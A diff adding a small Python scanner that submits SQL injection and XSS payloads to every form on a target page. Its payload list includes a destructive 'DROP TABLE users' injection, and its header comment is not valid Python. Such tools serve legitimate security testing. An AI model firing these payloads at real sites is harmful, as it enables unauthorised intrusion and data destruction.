@@ -1,0 +1,89 @@
+// DEVELOP A TOOL TO IDENTIFY COMMON
+ VULNERABILITIES (E.G., SQL INJECTION,
+ XSS) IN WEB APPLICATIONS.//
+
+import requests
+from bs4 import BeautifulSoup
+
+# Target URL (replace with your target URL)
+TARGET_URL = "http://example.com"
+
+# SQL Injection Payloads
+SQL_PAYLOADS = ["' OR 1=1 --", "'; DROP TABLE users --", "' UNION SELECT NULL--"]
+
+# XSS Payloads
+XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
+
+# Headers to mimic a browser
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+}
+
+def find_forms(url):
+    """Extract all forms from a web page."""
+    try:
+        response = requests.get(url, headers=HEADERS)
+        soup = BeautifulSoup(response.text, "html.parser")
+        forms = soup.find_all("form")
+        return forms
+    except Exception as e:
+        print(f"Error finding forms: {e}")
+        return []
+
+def submit_form(form, url, payload):
+    """Submit a form with a payload."""
+    action = form.get("action")
+    method = form.get("method", "get").lower()
+    form_url = url if action == "" or action is None else url + action
+
+    inputs = form.find_all("input")
+    data = {}
+    for input_field in inputs:
+        name = input_field.get("name")
+        if name:
+            data[name] = payload
+
+    try:
+        if method == "post":
+            return requests.post(form_url, data=data, headers=HEADERS)
+        else:
+            return requests.get(form_url, params=data, headers=HEADERS)
+    except Exception as e:
+        print(f"Error submitting form: {e}")
+        return None
+
+def test_sql_injection(url):
+    """Test for SQL injection vulnerabilities."""
+    forms = find_forms(url)
+    for form in forms:
+        print("\nTesting SQL injection...")
+        for payload in SQL_PAYLOADS:
+            response = submit_form(form, url, payload)
+            if response and ("error" in response.text.lower() or "syntax" in response.text.lower()):
+                print(f"[!] SQL Injection vulnerability found with payload: {payload}")
+                break
+        else:
+            print("[-] No SQL Injection vulnerability detected.")
+
+def test_xss(url):
+    """Test for XSS vulnerabilities."""
+    forms = find_forms(url)
+    for form in forms:
+        print("\nTesting XSS...")
+        for payload in XSS_PAYLOADS:
+            response = submit_form(form, url, payload)
+            if response and payload in response.text:
+                print(f"[!] XSS vulnerability found with payload: {payload}")
+                break
+        else:
+            print("[-] No XSS vulnerability detected.")
+
+def main():
+    print(f"Scanning website: {TARGET_URL}")
+    test_sql_injection(TARGET_URL)
+    test_xss(TARGET_URL)
+    print("\nScan complete.")
+
+if __name__ == "__main__":
+    main()
+
